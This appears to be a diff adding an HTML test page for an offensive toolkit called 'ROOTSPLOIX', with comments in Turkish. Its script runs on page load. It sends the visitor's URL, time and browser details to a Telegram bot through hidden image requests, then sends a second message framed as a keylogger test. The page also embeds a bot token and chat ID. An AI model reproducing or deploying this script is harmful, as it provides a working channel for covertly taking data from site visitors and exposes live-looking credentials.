@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ROOTSPLOIX Test</title>
+</head>
+<body>
+    <h1>ROOTSPLOIX TEST</h1>
+    <p id="status">Loading...</p>
+    
+    <script>
+    console.log('🔥 ROOTSPLOIX TEST BAŞLADI');
+    
+    // Telegram bilgileri
+    const botToken = '8295691131:AAEJjGLfXEtbHhTyqJ4RC7JFbpGnx_OHthM';
+    const chatId = '5312173877';
+    
+    // Test mesajı gönder
+    function sendTestMessage() {
+        const message = `🚨 TEST MESAJI ÇALIŞIYOR! 
+        
+🎯 Site: ${window.location.href}
+🕒 Zaman: ${new Date().toLocaleString('tr-TR')}
+💻 Browser: ${navigator.userAgent}
+
+✅ Framework test başarılı!`;
+
+        // IMG bypass ile gönder
+        const img = new Image();
+        img.src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        
+        console.log('📡 Telegram mesajı gönderildi!');
+        document.getElementById('status').innerText = 'Mesaj gönderildi - Telegram kontrol et!';
+        
+        // 2. mesaj - keylogger simulation
+        setTimeout(() => {
+            const keyMessage = `⌨️ KEYLOGGER TEST:
+            
+🎯 Session: test_${Date.now()}
+📝 Simulated keystroke: "test123"
+🌍 URL: ${window.location.href}
+
+💀 ROOTSPLOIX AKTIF!`;
+            
+            const img2 = new Image();
+            img2.src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(keyMessage)}`;
+            console.log('⌨️ Keylogger simülasyonu gönderildi!');
+        }, 3000);
+    }
+    
+    // Sayfa yüklendiğinde test başlat
+    window.addEventListener('load', () => {
+        console.log('✅ Sayfa yüklendi, test başlıyor...');
+        setTimeout(sendTestMessage, 1000);
+    });
+    
+    </script>
+</body>
+</html>
